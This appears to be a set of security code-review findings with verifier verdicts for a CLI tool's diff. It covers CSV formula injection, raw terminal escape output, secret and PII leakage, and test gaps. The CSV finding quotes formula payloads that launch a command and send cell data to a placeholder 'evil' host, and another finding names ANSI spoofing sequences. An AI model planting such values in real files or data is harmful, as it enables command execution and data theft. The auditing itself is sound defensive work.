samples.summary: CSV output does not neutralize spreadsheet-formula prefixes; this change adds new server-controlled sinks into the CSV path
samples.evidence: `csvEscape` (packages/cli/src/output/csv.ts:15-24) only quotes on `,`/`"`/`\n`; it never prefixes values that begin with `=`, `+`, `-`, `@`, tab or CR. Every value it emits is server-supplied and, in a shared workspace, settable by another member (document titles, cell values/formulas, and — newly reachable via this diff — workspace `name` through `wafflebase ctx list --format csv`, `buildWorkspaceList` in packages/cli/src/commands/ctx.ts:27). Attack: a collaborator renames a workspace or document to `=cmd|'/c calc'!A0` (or `=HYPERLINK("http://evil/"&A1)` for exfiltration); the victim runs `wafflebase ctx list --format csv > ws.csv` (a flow the diff's own docs now advertise as "the human path") and opens it in Excel/LibreOffice/Sheets, which evaluates the payload. The new `cell()` helper in packages/cli/src/output/table.ts:9 was written to "mirror what formatCsv already does", so the same unescaped convention is being propagated rather than fixed. Pre-existing in csv.ts, but the diff widens the reachable data set.

samples.summary: Table renderer emits raw server-controlled strings (incl. ANSI/control sequences) to the terminal, and the diff extends that path to single objects
samples.evidence: `cell()` (packages/cli/src/output/table.ts:9) and the array path (:46, :53) pass values through `String()` with no control-character stripping, then `output()` writes them via `console.log` (packages/cli/src/output/formatter.ts:61). JSON mode escapes control chars via `JSON.stringify`; table mode does not. Attack: a workspace collaborator sets a document title or cell value containing `]0;...` / `[2J` / cursor-movement sequences; the victim runs `wafflebase docs get <id> --format table` — a path that before this diff returned `(no results)` for a single object (old table.ts:4) and now renders every field raw (new formatRecord at table.ts:19-25) — and the escape sequences reach their terminal, enabling output spoofing (e.g. forging a fake 'Session: valid' row or a fake prompt) and, on terminals with title-report/paste features enabled, command injection. Could not confirm a specific terminal exploit, hence low confidence; the unescaped sink itself is at table.ts:9.

samples.summary: `api-keys create` writes the raw secret to stdout even when the user passed `--quiet`
samples.evidence: packages/cli/src/commands/api-keys.ts:27 calls `output(res.data, fmt, false)` — the `quiet` argument is hardcoded `false`, so `wafflebase api-keys create ci-key --quiet` prints the one-time raw key to stdout despite an explicit suppression request. In CI, `--quiet` is exactly the flag an operator sets expecting nothing sensitive to be emitted into the captured job log, so the secret lands in build logs/agent transcripts. The intent is documented in the adjacent comment and the behavior predates this diff, but the diff touches this line; a safer shape is to honor `--quiet` and surface the key only on an explicit sink (e.g. `--out`) or fail loudly when suppression would discard it.

samples.summary: No regression test asserts that `status` output omits accessToken/refreshToken
samples.evidence: `buildStatus` (packages/cli/src/commands/status.ts:38-55) correctly enumerates fields and omits `accessToken`/`refreshToken`, and `status` is now the command agents are told to parse. But the new suite only asserts field equality for the current shape; nothing asserts the negative. A future refactor to `{ loggedIn: true, ...session }` (a very natural simplification, since the payload is already flat by design) would dump both bearer tokens to stdout and into every agent transcript, and every existing test would still pass except the two `toEqual` cases — which a refactorer would simply update. Grepped the whole cli test dir for `accessToken`/`refreshToken` assertions: the only hits are fixtures (config.test.ts, session.test.ts, status.test.ts:25-26), none asserting absence from rendered output.

samples.summary: Test fixture writes a session file containing tokens with default (world-readable) permissions, bypassing saveSession's 0600 hardening
samples.evidence: packages/cli/test/status.test.ts:140 does `writeFileSync(path, JSON.stringify(session))` with no `mode`, so the file lands at 0666&umask (typically 0644) inside the mkdtemp dir, unlike the production writer `saveSession`, which deliberately uses `{ mode: 0o600 }` plus an explicit `chmodSync` (packages/cli/src/config/session.ts:68-70). The tokens here are dummies ('access'/'refresh'), so there is no live secret exposure — the concern is that this becomes the copy-paste pattern for future session fixtures and that the test does not exercise the permission contract it bypasses. Prefer `saveSession(session, path)` or pass `{ mode: 0o600 }`.

samples.summary: `status` now emits email, full workspace UUID and the raw server URL as default machine-readable output, widening what gets captured verbatim in logs
samples.evidence: buildStatus (packages/cli/src/commands/status.ts:47-53) emits `email`, un-truncated `workspaceId` (the old prose printed `activeWorkspace.slice(0,8)`) and `server` verbatim. `session.server` is whatever the user passed to `wafflebase login --server`, so a URL carrying userinfo (`https://user:token@host`) is echoed in full. Because JSON is the default and `status` is the first command agents run, this output is now far more likely to be persisted verbatim into transcripts and CI logs than the previous prose line. No bearer token is exposed, so impact is limited to PII/identifier and a corner-case credential-in-URL leak; consider redacting userinfo from `server`.

verdict.reason: Verified present and reachable exactly as described. `csvEscape` (packages/cli/src/output/csv.ts:15-24) quotes only on `,`, `"`, `\n` (line 20) and never neutralizes leading `=`, `+`, `-`, `@`, tab or CR; it is applied to header and all cells (csv.ts:26-27). Two server-data paths reach it: (a) `ctx list --format csv` — ctx.ts:73-83 feeds `buildWorkspaceList` (ctx.ts:23-32, emits `name` verbatim at line 29, sourced from session.ts:21) into `output()` → formatter.ts:49-50 → `formatCsv`; (b) `sheets export` — sheets-export.ts:39-51 pipes the `getCells` response through `formatCsv` and `writeFileSync`s a real .csv, the highest-risk sink. I grepped all of packages/ for any formula-neutralizing guard: every `startsWith('=')` hit is formula parsing in packages/sheets (formula/formula.ts:202, view/worksheet.ts:939) or the XLSX importer (xlsx-importer.ts:204); the only sanitizer present is an unrelated filename sanitizer (frontend/src/app/docs/export-utils.ts:110). So no `already-guarded` ground. The propagation claim also holds: table.ts:5 comments that `cell()` "Mirrors what `formatCsv` already does". CSV/formula injection is unsafe output encoding in the injection bucket, so it is in-lane; major is correct since exploitation requires the victim to open the file and click through a spreadsheet warning. Pre-existing location does not exempt it per the rubric.

finding.summary: Table renderer emits raw server-controlled strings (incl. ANSI/control sequences) to the terminal, and the diff extends that path to single objects
finding.evidence: `cell()` (packages/cli/src/output/table.ts:9) and the array path (:46, :53) pass values through `String()` with no control-character stripping, then `output()` writes them via `console.log` (packages/cli/src/output/formatter.ts:61). JSON mode escapes control chars via `JSON.stringify`; table mode does not. Attack: a workspace collaborator sets a document title or cell value containing `]0;...` / `[2J` / cursor-movement sequences; the victim runs `wafflebase docs get <id> --format table` — a path that before this diff returned `(no results)` for a single object (old table.ts:4) and now renders every field raw (new formatRecord at table.ts:19-25) — and the escape sequences reach their terminal, enabling output spoofing (e.g. forging a fake 'Session: valid' row or a fake prompt) and, on terminals with title-report/paste features enabled, command injection. Could not confirm a specific terminal exploit, hence low confidence; the unescaped sink itself is at table.ts:9.

verdict.reason: The quoted code exists exactly as described (table.ts:7-9 bare String(), :19-25 formatRecord, :46/:53 array path, formatter.ts:61 console.log), and no sanitizer exists anywhere in packages/cli/src — so it is not "not-present" or "already-guarded". However it is not blocking under the Security rubric: there is no interpreter-level injection sink, only terminal escape sequences whose exploitability the reviewer could not establish, which is hardening (minor) impact. Critically, the identical exposure with strictly greater attacker control is the CLI's intended pre-existing behavior on unrelated paths: docs/content.ts:47-51 (and notes/content.ts:31-32, slides/content.ts:47-48, docs/import.ts:47-48) write the entire server-supplied document body raw to process.stdout with no TTY check or filtering, and login.ts:111/115/123 interpolate server-supplied workspace names straight into console.log; csv.ts:15-24 likewise escapes only ,/"/newline. Stripping control chars in table.ts alone would not reduce attacker capability, so the table renderer is not the security boundary and this is a hardening suggestion rather than a merge-gating vulnerability.
